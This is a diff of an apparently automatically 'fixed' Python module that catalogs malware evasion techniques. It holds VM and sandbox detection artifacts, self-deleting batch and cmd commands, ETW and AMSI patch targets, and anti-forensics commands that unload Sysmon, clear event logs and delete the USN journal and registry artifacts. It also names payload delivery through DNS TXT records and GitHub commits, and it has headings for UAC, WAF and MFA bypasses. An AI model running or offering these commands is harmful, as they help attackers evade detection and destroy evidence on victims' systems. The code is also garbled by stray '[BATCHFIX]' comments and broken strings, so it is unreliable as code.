@@ -18,7 +18,7 @@ try:
 except ImportError:
 
 """
-    from typing import Dict, Any
+from typing import Dict, Any
 
 
 
@@ -31,7 +31,7 @@ Intelligence engine for anti-forensics, anti-debugging, and evasion techniques.#
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def get_anti_vm_checks() -> Dict[str, Any]:"Extensive collection of artifacts used to detect Virtual Machines and Sandboxes.        return {
             "registry": {"                "vmware": ["# [BATCHFIX] Commented metadata/non-Python
 #                     rHKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools","  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
@@ -64,7 +64,7 @@ def get_anti_vm_checks() -> Dict[str, Any]:"Extensive collection of artifacts us
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def get_self_deletion_techniques() -> Dict[str, str]:"Multi-method approaches for executable self-deletion (Melt).        return {
             "delay_reboot": "MoveFileExW(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)","            "batch_melt": '@echo off\\ntimeout /t 3\\ndel "%s"\\ndel "%%~f0"',"'            "cmd_timeout": 'cmd.exe /C timeout /t 2 && del "%s"',"'            "modern_melt": "SetFileInformationByHandle(handle, FileRenameInfo, FILE_FLAG_DELETE_ON_CLOSE)","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis"""
@@ -75,7 +75,7 @@ def get_self_deletion_techniques() -> Dict[str, str]:"Multi-method approaches fo
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def get_etw_patching_gadgets() -> Dict[str, Any]:"Byte patterns for patching Event Tracing for Windows (ETW).# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unterminated string"""
 #        " return {"  # [BATCHFIX] closed string"            "nttraceevent_patch": {"                "dll": "ntdll.dll","                "function": "NtTraceEvent","# [BATCHFIX] Commented metadata/non-Python
@@ -92,7 +92,7 @@ def get_etw_patching_gadgets() -> Dict[str, Any]:"Byte patterns for patching Eve
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def get_amsi_bypass_gadgets() -> Dict[str, Any]:"Techniques for bypassing Anti-Malware Scan Interface (AMSI).# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unterminated string"""
 #     "    return {"  # [BATCHFIX] closed string"            "amsi_scan_buffer_patch": {"                "dll": "amsi.dll","                "function": "AmsiScanBuffer","# [BATCHFIX] Commented metadata/non-Python
@@ -109,13 +109,13 @@ def get_amsi_bypass_gadgets() -> Dict[str, Any]:"Techniques for bypassing Anti-M
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def get_anti_forensics_techniques() -> Dict[str, str]:"Techniques to erase footprints and disrupt forensic analysis (Ported from Forensia).# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unterminated string"""
 #  "       return {"  # [BATCHFIX] closed string"            "sysmon_unload": "fltmc unload SysmonDrv","            "usn_journal_disable": "fsutil usn deletejournal /D {drive}:","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis"""
 #             "prefetch_disable_reg": ("# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 rreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"  # [BATCHFIX] closed string"#                 r"\\Memory Management\\PrefetchParameters\" /v EnablePrefetcher /t REG_DWORD /d 0 /f"            ),
             "event_log_clear": "wevtutil cl {log_name}","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis"""
@@ -128,12 +128,12 @@ rreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"  # [BATCHF
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis"""
 #             "clear_shellbags": ("# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 rreg delete \"HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows"  # [BATCHFIX] closed string"#                 r"\\Shell\\BagMRU\" /f"            ),
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis"""
 #             "clear_shimcache": ("# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 rreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"  # [BATCHFIX] closed string"#                 r"\\AppCompatCache\" /v AppCompatCache /f"            ),
         }
 
@@ -141,7 +141,7 @@ rreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"  # [BAT
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def get_waf_bypass_techniques() -> Dict[str, str]:"Techniques for bypassing Web Application Firewalls (Ported from FlareSolverr).        return {
             "headless_browser_fingerprint_spoofing": "Overriding navigator.webdriver and other headless indicators","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis"""
@@ -153,7 +153,7 @@ def get_waf_bypass_techniques() -> Dict[str, str]:"Techniques for bypassing Web 
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def get_payload_delivery_methods() -> Dict[str, str]:"Advanced methods for retrieving and executing payloads".        return {
             "stego_cert_extension": "Retrieving payload from x509 extension OID 1.2.3.4.5.6 (EXEfromCER)","            "dns_txt_record": "Retrieving shellcode from staged DNS TXT records","            "git_commit_messages": "Polling GitHub commit messages for encoded commands","# [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis"""
@@ -165,7 +165,7 @@ def get_payload_delivery_methods() -> Dict[str, str]:"Advanced methods for retri
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def get_uac_bypass_methods() -> Dict[str, str]:"Known UAC bypass techniques using auto-elevated binaries.        return {
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unterminated string"""
@@ -179,7 +179,7 @@ def get_uac_bypass_methods() -> Dict[str, str]:"Known UAC bypass techniques usin
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def get_mfa_bypass_techniques() -> Dict[str, str]:"Techniques for bypassing multi-factor authentication (Ported from EvilGinx2).        return {
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented unmatched parenthesis"""
